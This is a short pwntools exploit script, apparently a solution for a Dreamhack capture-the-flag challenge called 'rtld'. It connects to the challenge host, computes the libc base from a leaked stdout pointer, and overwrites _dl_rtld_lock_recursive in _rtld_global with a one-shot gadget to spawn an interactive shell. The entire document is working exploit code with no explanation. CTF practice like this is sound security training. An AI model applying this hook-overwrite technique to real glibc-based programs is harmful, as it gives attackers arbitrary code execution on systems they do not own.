from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/rtld')
    stdout_offset = 0x3c5620
    oneshot_offset = 0xf1247
    rtld_global_offset = 0x5f0040

else:
    r = remote('host1.dreamhack.games', 9122)
    stdout_offset = 0x3c5620
    oneshot_offset = 0xf1147
    rtld_global_offset = 0x5f0040


# leak libc

r.recvuntil('stdout: 0x')
stdout = int(r.recvline()[:-1], 16)  # _IO_2_1_stdout_
libc = stdout - stdout_offset  # libc base
oneshot = libc + oneshot_offset  # oneshot gadget
rtld_global = libc + rtld_global_offset  # _rtld_global


# overwrite _dl_rtld_lock_recursive with oneshot gadget

r.sendlineafter('addr: ', str(rtld_global + 3848))
r.sendlineafter('value: ', str(oneshot))


r.interactive()